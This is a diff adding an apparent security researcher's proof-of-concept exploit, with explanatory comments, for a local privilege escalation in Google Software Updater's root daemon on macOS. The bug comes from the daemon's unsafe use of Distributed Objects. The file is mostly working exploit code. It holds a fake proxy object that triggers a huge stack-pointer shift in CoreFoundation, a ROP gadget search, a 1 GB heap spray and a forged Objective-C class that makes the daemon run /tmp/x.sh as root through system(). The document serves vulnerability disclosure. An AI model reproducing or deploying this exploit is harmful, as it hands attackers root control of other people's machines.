@@ -1,0 +1,321 @@
+/*
+Google software updater ships with Chrome on MacOS and installs a root service (com.google.Keystone.Daemon.UpdateEngine)
+which lives here: /Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/GoogleSoftwareUpdateDaemon
+
+This service vends a Distributed Object which exposes an API for updating google software running on the machine.
+
+Distributed Objects are very very hard to safely use across a privileged boundary.
+
+The GoogleSoftwareUpdateDaemon process attempts to "sanitize" objects passed to it by serializing
+and deserializing them to a plist, however this still means we can attack the plist serializing code!
+
+Specifically, with D.O. we can pass proxy objects which allow us to overload all objective-c
+method calls. We can make the plist code think it's serializing a CFString, and then change our behaviour
+to return a different CFTypeID so we become a dictionary for example.
+
+The plist serialization code is not written to defend against such proxy objects, because D.O. should not be
+used across a privilege boundary.
+
+In this case I'm targetting the following code in CoreFoundation:
+
+static void _flattenPlist(CFPropertyListRef plist, CFMutableArrayRef objlist, CFMutableDictionaryRef objtable, CFMutableSetRef uniquingset);
+
+plist will be a proxy for the FakeCFObject I define. We can first pretend to be a CFString to pass some other type checks, then become a CFDictionary
+(by simply returning a different return value for the _cfTypeID method.) We can then reach the following code:
+
+    CFIndex count = CFDictionaryGetCount((CFDictionaryRef)plist);
+    STACK_BUFFER_DECL(CFPropertyListRef, buffer, count <= 128 ? count * 2 : 1);
+    CFPropertyListRef *list = (count <= 128) ? buffer : (CFPropertyListRef *)CFAllocatorAllocate(kCFAllocatorSystemDefault, 2 * count * sizeof(CFTypeRef), __kCFAllocatorGCScannedMemory);
+    CFDictionaryGetKeysAndValues((CFDictionaryRef)plist, list, list + count);
+    for (CFIndex idx = 0; idx < 2 * count; idx++) {
+      _flattenPlist(list[idx], objlist, objtable, uniquingset);
+    }
+
+Since we're not a real CFDictionary we can return an arbitrary value for count. If we return a value < 0 it will be used to calculate the size of a stack buffer.
+By passing a carefully chosen value this lets you move the stack pointer down an arbitrary amount, off the bottom of the stack and potentially into another thread's stack
+or on to the heap, allowing memory corruption.
+
+There will be dozens of other places where attack-controlled proxy objects will be able to interact with system code that was not written expecting to have
+to deal with proxy objects.
+
+The correct fix is to not use Distributed Objects across a privilege boundary, as per Apple's advice:
+https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/DesigningDaemons.html
+
+build this PoC:
+clang -o ks ks.m -framework Foundation -framework CoreFoundation
+
+start lldb waiting for the daemon to start:
+sudo lldb --wait-for -n "/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/GoogleSoftwareUpdateDaemon"
+
+continue lldb and run the poc, you should see that the stack ends up pointing well outside the stack :)
+*/
+
+/*
+ianbeer
+Google software updater LPE on MacOS due to unsafe use of Distributed Objects
+
+Google software updater ships with Chrome on MacOS and installs a root service (com.google.Keystone.Daemon.UpdateEngine)
+which lives here: /Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/GoogleSoftwareUpdateDaemon
+
+This service vends a Distributed Object which exposes an API for updating google software running on the machine.
+
+Distributed Objects are very very hard to safely use across a privileged boundary.
+
+The GoogleSoftwareUpdateDaemon process attempts to "sanitize" objects passed to it by serializing
+and deserializing them to a plist, however this still means we can attack the plist serializing code!
+
+Specifically, with D.O. we can pass proxy objects which allow us to overload all objective-c
+method calls. We can make the plist code think it's serializing a CFString, and then change our behaviour
+to return a different CFTypeID so we become a dictionary for example.
+
+The plist serialization code is not written to defend against such proxy objects, because D.O. should not be
+used across a privilege boundary.
+
+In this case I'm targetting the following code in CoreFoundation:
+
+static void _flattenPlist(CFPropertyListRef plist, CFMutableArrayRef objlist, CFMutableDictionaryRef objtable, CFMutableSetRef uniquingset);
+
+plist will be a proxy for the FakeCFObject I define. We can first pretend to be a CFString to pass some other type checks, then become a CFDictionary
+(by simply returning a different return value for the _cfTypeID method.) We can then reach the following code:
+
+    CFIndex count = CFDictionaryGetCount((CFDictionaryRef)plist);
+    STACK_BUFFER_DECL(CFPropertyListRef, buffer, count <= 128 ? count * 2 : 1);
+    CFPropertyListRef *list = (count <= 128) ? buffer : (CFPropertyListRef *)CFAllocatorAllocate(kCFAllocatorSystemDefault, 2 * count * sizeof(CFTypeRef), __kCFAllocatorGCScannedMemory);
+    CFDictionaryGetKeysAndValues((CFDictionaryRef)plist, list, list + count);
+    for (CFIndex idx = 0; idx < 2 * count; idx++) {
+      _flattenPlist(list[idx], objlist, objtable, uniquingset);
+    }
+
+Since we're not a real CFDictionary we can return an arbitrary value for count. If we return a value < 0 it will be used to calculate the size of a stack buffer.
+By passing a carefully chosen value this lets you move the stack pointer down an arbitrary amount, off the bottom of the stack and potentially into another thread's stack
+or on to the heap, allowing memory corruption.
+
+There will be dozens of other places where attack-controlled proxy objects will be able to interact with system code that was not written expecting to have
+to deal with proxy objects.
+
+The correct fix is to not use Distributed Objects across a privilege boundary, as per Apple's advice:
+https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/DesigningDaemons.html
+
+build this PoC:
+clang -o ks_r00t ks_r00t.m -framework Foundation -framework CoreFoundation
+
+This PoC exploit will run the shell script /tmp/x.sh as root.
+*/
+
+#import <objc/Object.h>
+#import <Foundation/Foundation.h>
+#import <CoreFoundation/CoreFoundation.h>
+
+#include <dlfcn.h>
+
+#import <stdio.h>
+#include <stdlib.h>
+#import <unistd.h>
+
+@interface FakeCFObject : NSObject
+{
+  int count;
+}
+
+- (id) init;
+- (CFTypeID) _cfTypeID;
+- (void) getObjects:(id)objs andKeys:(id)keys;
+- (void) getObjects:(id)objs range:(id)r;
+- (unsigned long) count;
+@end
+
+@implementation FakeCFObject
+- (id)init {
+  self = [super init];
+  if (self) {
+    count = 0;
+  }
+  return self;
+}
+
+- (CFTypeID) _cfTypeID;
+{
+  NSLog(@"called cfTypeID");
+  count++;
+
+  switch (count) {
+    case 1:
+      return CFStringGetTypeID();
+    default:
+      return CFArrayGetTypeID();
+  }
+}
+
+- (unsigned long) count;
+{
+  NSLog(@"called count");
+  uint64_t rsp_guess = 0x700006000000;
+  uint64_t heap_spray_guess = 0x150505000;
+  uint64_t sub_rsp = rsp_guess - heap_spray_guess;
+  sub_rsp >>= 3;
+  sub_rsp |= (1ull<<63);
+  printf("count: 0x%016llx\n", sub_rsp);
+  return sub_rsp;
+}
+
+- (void) getObjects:(id)objs andKeys:(id)keys;
+{
+  NSLog(@"called getObjects_andKeys");
+}
+
+- (void) getObjects:(id)objs range:(id)r;
+{
+  NSLog(@"called getObjects_andKeys");
+}
+
+@end
+
+// heap sprap assumption is that this will end up at 0x150505000
+/*
+  heap spray structure:
+  we need to spray for two values, firstly the bug will sub rsp, CONTROLLED
+  we want that to put the stack into the spray allocation
+
+
+    +----------------------+
+    |                      |
+    | regular thread stack |
+    |                      |
++-- +......................+   <-- base of stack when we use the bug to cause a
+|   .                      .       massive sub rsp, X to move the stack pointer into the heap spray
+|   .  <many TB of virtual .
+|   .   address space>     .
+|   .                      .
+|   | + - - - - - - - + <--^--- 1G heap spray
+|   | | FAKE_OBJC     |    |     top half is filled with fake objective c class objects
+|   | | FAKE_OBJC     |    |     bottom half is filled with 0x170707000
+|   | | FAKE_OBJC     |    |
+|   | |     ...       |    | +--- these pointers all hopefully point somewhere into the top half of the heap spray
+|   | + - - - - - - - +    | |
+|   | |  0x170707000  | <--^-+
+|   | |  0x170707000  |    |  +-- this is the first entry in the stack-allocated buffer
+|   | |  0x170707000  |    |  |   if we override the getObjectsforRange selector of the D.O. so that nothing gets
+|   | |     ...       |    |  |   filled in here this will be used uninitialized
+|   | |  0x170707000  | <--^--+
++-> +-----------------| <--^--- rsp points here after the massive sub.
+    | |  0x170707000  |    |    we want rsp to point anywhere in the lower half of the heap spray
+    | |  xxxxxxxxxxx  |    |
+    | |  xxxxxxxxxxx  |    |
+    | |  0x170707000  |    |
+    | +---------------+ <--^--- we send this 1G region as an NSData object
+    .                      .
+    .                      .
+
+
+  When we get RIP control rdi will point to the bottom of the alloca buffer.
+  That is, it will point to a qword containing 0x170707070
+
+  The gadget below will turn that into RIP control with rdi pointing to the fake objective-c
+  class object. Since the first 16 bytes of that are unused by objc_msgSend we can point the
+  second fptr to system and put a 16 byte command at the start of the fake class.
+*/
+
+
+// this is tls_handshake_set_protocol_version_callback in Security.framework:
+char* gadget =
+"\x55"             // push rbp
+"\x48\x89\xE5"     // mov rbp, rsp
+"\x89\x77\x58"     // mov [rdi+58h], esi
+"\x48\x8B\x47\x28" // mov rax, [rdi+28h]
+"\x48\x8B\x7F\x30" // mov rdi, [rdi+30h]
+"\x48\x8B\x40\x30" // mov rax, [rax+30h]
+"\x5D"             // pop rbp
+"\xFF\xE0";        // jmp rax
+
+uint64_t gadget_address() {
+  void* haystack = dlsym(RTLD_DEFAULT, "NSAllocateObject");
+  printf("haystack: %p\n", haystack);
+
+  void* found_at = memmem(haystack, 0x10000000, gadget, 22);
+  printf("found at: %p\n", found_at);
+
+  return found_at;
+}
+
+// heap spray target of 0x170707000
+// this will be the page containing the fake objective c object
+void* build_upper_heap_spray_page() {
+  uint64_t spray_target = 0x170707000;
+  uint64_t target_fptr = gadget_address();
+
+  struct fake_objc_obj {
+    char cmd[16];
+    uint64_t cache_buckets_ptr;  // +0x10
+    uint64_t cache_buckets_mask; // +0x18
+    uint64_t cached_sel;         // +0x20
+    uint64_t cached_fptr;        // +0x28
+    uint64_t second_fptr;        // +0x30
+  };
+
+  struct fake_objc_obj* buf = malloc(PAGE_SIZE);
+  memset(buf, 'B', PAGE_SIZE);
+  
+  uint64_t target_selector = (uint64_t)sel_registerName("class");
+  printf("target selector address: %llx\n", target_selector);
+
+  strcpy(buf->cmd, "/tmp/x.sh");
+  buf->cache_buckets_ptr = spray_target + 0x20;
+  buf->cache_buckets_mask = 0;
+  buf->cached_sel = target_selector;
+  buf->cached_fptr = target_fptr;
+
+  buf->second_fptr = (uint64_t)system;
+
+  return buf;
+}
+
+// heap spray target of 0x150505000
+// this will be the page containing the pointer to the fake objective c class
+void* build_lower_heap_spray_page() {
+  uint64_t* buf = malloc(PAGE_SIZE);
+  for (int i = 0; i < PAGE_SIZE/8; i++) {
+    buf[i] = 0x170707000;
+  }
+  return buf;
+}
+
+int main() {
+  id theProxy;
+  theProxy = [[NSConnection
+      rootProxyForConnectionWithRegisteredName:@"com.google.Keystone.Daemon.UpdateEngine"
+      host:nil] retain];
+
+  printf("%p\n", theProxy);
+
+	FakeCFObject* obj = [[FakeCFObject alloc] init];
+
+  NSDictionary* dict = @{@"ActivesInfo": obj};
+
+  id retVal = [theProxy claimEngineWithError:nil];
+  printf("retVal: %p\n", retVal);
+
+  uint32_t heap_spray_MB = 1024;
+  uint32_t heap_spray_bytes = heap_spray_MB * 1024 * 1024;
+  uint32_t heap_spray_n_pages = heap_spray_bytes / PAGE_SIZE;
+  
+  void* lower_heap_spray_page = build_lower_heap_spray_page();
+  void* upper_heap_spray_page = build_upper_heap_spray_page();
+
+  uint8_t* heap_spray_full_buffer = malloc(heap_spray_bytes);
+  for (int i = 0; i < heap_spray_n_pages/2; i++) {
+    memcpy(&heap_spray_full_buffer[i*PAGE_SIZE], lower_heap_spray_page, PAGE_SIZE);
+  }
+  
+  for (int i = heap_spray_n_pages/2; i < heap_spray_n_pages; i++) {
+    memcpy(&heap_spray_full_buffer[i*PAGE_SIZE], upper_heap_spray_page, PAGE_SIZE);
+  }
+
+  // wrap that in an NSData:
+  NSData* data = [NSData dataWithBytes:heap_spray_full_buffer length:heap_spray_bytes];
+
+  // trigger the bugs
+  [retVal setParams:dict authenticationPort:data];
+
+  return 0;
+
+}
